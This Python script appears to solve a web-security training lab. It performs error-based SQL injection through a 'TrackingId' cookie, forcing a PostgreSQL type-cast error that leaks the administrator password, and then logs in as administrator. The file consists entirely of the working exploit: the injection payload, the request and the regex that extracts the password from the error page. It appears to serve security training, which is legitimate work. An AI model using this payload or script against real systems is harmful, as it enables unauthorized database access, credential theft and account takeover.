from lib import (
    SESSION,
    check_is_lab_solved,
    generate_parser,
    login_as_administrator,
)
import re

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    administrator_password = ""

    print("[+] Getting the `administrator` password")
    print(
        f"[!] Making request to {lab_url} with TrackingId=' AND (SELECT password FROM users LIMIT 1)::int=1 --"
    )

    response = SESSION.get(
        f"{lab_url}/",
        cookies={"TrackingId": "' AND (SELECT password FROM users LIMIT 1)::int=1 --"},
    )

    if response.status_code == 500:
        result = re.search(
            r'ERROR: invalid input syntax for type integer: "(.+?)"', response.text
        )

        if result:
            administrator_password = result.group(1)
            print(f"[+] Found `administrator` password: {administrator_password}")
        else:
            print("[-] Failed to find `administrator` password")

    else:
        print("[-] Failed to get `administrator` password")

    login_as_administrator(lab_url, administrator_password)

    check_is_lab_solved(lab_url)
